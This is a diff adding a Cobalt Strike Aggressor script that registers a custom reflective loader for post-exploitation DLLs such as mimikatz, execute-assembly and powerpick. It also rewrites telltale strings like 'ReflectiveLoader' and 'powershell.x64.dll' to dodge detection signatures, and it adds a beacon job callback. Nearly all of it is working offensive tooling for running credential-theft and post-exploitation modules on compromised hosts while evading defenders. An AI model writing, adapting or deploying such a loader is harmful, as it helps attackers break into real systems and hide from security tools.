@@ -1,0 +1,51 @@
+# POSTEX_RDLL_GENERATE — Crystal Palace Post-Exploitation Loader Hook
+#
+# Registers the custom post-exploitation reflective loader. Applies to
+# execute-assembly, mimikatz, powerpick, and operator-authored postex DLLs.
+#
+# Also includes string signature rewrites for postex DLL strings that
+# are commonly used as detection material.
+
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+set POSTEX_RDLL_GENERATE {
+    local('$postex $arch $spec_path $spec $final');
+    $postex = $2; $arch = $3;
+
+    if ($arch eq "x86") {
+        warn("Crystal Kit is x64 only");
+        return $null;
+    }
+
+    # Postex string signature rewrites
+    $postex = strrep_pad($postex, "w/hr", "err");
+    $postex = strrep_pad($postex, "[-]",  "[!]");
+    $postex = strrep_pad($postex, "ReflectiveLoader",       "legitLoader");
+    $postex = strrep_pad($postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll");
+    $postex = strrep_pad($postex, "powershell.x64.dll",     "weakshell.x64.dll");
+
+    $spec_path = getFileProper(script_resource("postex"), "loader.spec");
+    $spec  = [LinkSpec Parse: $spec_path];
+    $final = [$spec run: $postex, [new HashMap]];
+
+    return $final;
+}
+
+# Postex callback handler for structured output
+# Usage with beacon_execute_postex_job:
+#   $args = bof_pack($bid, "zi", $name, $age);
+#   beacon_execute_postex_job($bid, $null, $dll, $args, $callback);
+
+$callback = lambda({
+    local('$bid $result %info $type $jid');
+    this('$jid');
+    ($bid, $result, %info) = @_;
+    $type = %info['type'];
+    $jid  = %info['jid'];
+
+    if      ($type eq 'job_registered') { }
+    else if ($type eq 'output')         { bjoblog($bid, $jid, $result); }
+    else if ($type eq 'error')          { bjoberror($bid, $jid, $result); }
+    else if ($type eq 'job_completed')  { $jid = $null; }
+});
